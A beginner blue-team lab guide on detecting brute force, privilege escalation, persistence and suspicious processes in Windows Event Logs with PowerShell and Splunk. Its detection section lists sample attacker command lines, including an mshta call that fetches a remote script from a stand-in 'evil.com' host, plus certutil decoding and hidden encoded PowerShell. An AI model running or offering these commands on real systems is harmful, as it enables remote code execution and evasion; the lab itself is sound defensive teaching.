# Lab 01: Windows Event Log Analysis

**Difficulty:** Beginner
**Time:** 45–60 minutes
**Category:** Log Analysis / Threat Detection
**Tools:** Windows Event Viewer, PowerShell, Splunk (optional)

---

## Objective

Learn to analyze Windows Event Logs to detect suspicious activity including failed logins, privilege escalation, account creation, and suspicious process execution.

---

## Key Windows Event IDs Reference

| Event ID | Description | Significance |
|---|---|---|
| 4624 | Successful logon | Baseline activity |
| 4625 | Failed logon | Brute force indicator |
| 4648 | Logon using explicit credentials | Pass-the-hash / lateral movement |
| 4672 | Special privileges assigned | Privilege escalation |
| 4720 | User account created | Persistence / backdoor |
| 4728 | User added to security group | Privilege escalation |
| 4732 | User added to local admin group | **HIGH PRIORITY** |
| 4688 | New process created | Malware execution |
| 4698 | Scheduled task created | Persistence |
| 4104 | PowerShell script block logging | Malicious scripts |
| 7045 | New service installed | Persistence / malware |

---

## Lab Exercises

### Exercise 1: Find Failed Login Attempts

**Using PowerShell:**
```powershell
# Get all failed logins (Event ID 4625) in last 24 hours
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4625
    StartTime = (Get-Date).AddHours(-24)
} | Select-Object TimeCreated, Message | Format-Table -AutoSize

# Count failed logins per user
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} |
    ForEach-Object { $_.Properties[5].Value } |
    Group-Object | Sort-Object Count -Descending |
    Select-Object Name, Count
```

**Expected Output Analysis:**
- More than 10 failures from same account → Possible brute force
- Failures for non-existent accounts → Username enumeration
- Failures from external IPs → Remote attack

**Questions:**
1. Which accounts had the most failed login attempts?
2. What logon types were used? (Type 3 = Network, Type 10 = RemoteInteractive)
3. Are the source IPs internal or external?

---

### Exercise 2: Detect Privilege Escalation

**PowerShell:**
```powershell
# Find accounts added to admin groups (Event 4732)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4732} |
    Select-Object TimeCreated,
    @{N='User';E={$_.Properties[0].Value}},
    @{N='Group';E={$_.Properties[2].Value}},
    @{N='AddedBy';E={$_.Properties[6].Value}}

# Check for new user creation (Event 4720)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4720} |
    Select-Object TimeCreated,
    @{N='NewUser';E={$_.Properties[0].Value}},
    @{N='CreatedBy';E={$_.Properties[4].Value}}
```

**Red Flags:**
- Admin account created outside business hours
- Account added to Domain Admins
- Account created then immediately used

---

### Exercise 3: Suspicious Process Execution

**PowerShell (requires Process Creation Auditing enabled):**
```powershell
# Find suspicious PowerShell executions (Event 4688)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} |
    Where-Object { $_.Message -match 'powershell|cmd|wscript|mshta|certutil' } |
    Select-Object TimeCreated,
    @{N='Process';E={$_.Properties[5].Value}},
    @{N='CommandLine';E={$_.Properties[9].Value}} |
    Format-Table -AutoSize
```

**Suspicious Command Patterns:**
```
powershell -enc <base64>          # Encoded command (obfuscation)
powershell -nop -w hidden         # Hidden execution
certutil -decode file.txt out.exe # LOLBin abuse
mshta http://evil.com/script.hta  # Remote script execution
wscript /e:jscript script.txt     # Script execution bypass
```

---

### Exercise 4: Scheduled Task Persistence

```powershell
# Find newly created scheduled tasks (Event 4698)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4698} |
    Select-Object TimeCreated, Message

# List all scheduled tasks with their actions
Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} |
    Select-Object TaskName, TaskPath,
    @{N='Action';E={$_.Actions.Execute}} |
    Where-Object {$_.Action -match 'powershell|cmd|wscript|http'}
```

---

## SIEM Queries (Splunk)

```spl
# Brute force detection
index=wineventlog EventCode=4625
| stats count by src_ip, user, host
| where count > 10
| sort -count

# Lateral movement via explicit credentials
index=wineventlog EventCode=4648
| table _time, user, Target_Server, Process_Name

# New admin account
index=wineventlog EventCode=4732 
| search Group_Name="Administrators"
| table _time, Member_Name, Group_Name, Subject_Account_Name
```

---

## Lab Completion Checklist

```
[ ] Identified failed login attempts and counted by account
[ ] Found any successful logins after failures (brute force success?)
[ ] Checked for new user account creation
[ ] Verified no unauthorized additions to admin groups
[ ] Reviewed process creation logs for suspicious commands
[ ] Checked for suspicious scheduled tasks
[ ] Documented all findings
```

---

## Key Takeaways

1. **4625 + 4624 from same IP** = Brute force success — critical alert
2. **4720 + 4732 together** = Account backdoor — investigate immediately
3. **4688 with encoded PowerShell** = Likely malware — isolate host
4. **4698 at unusual hours** = Persistence mechanism — remove and investigate

---

*Lab designed by: Badi Alosaimi | Blue Team Labs*
*Difficulty: Beginner | Version: 1.0 | April 2026*
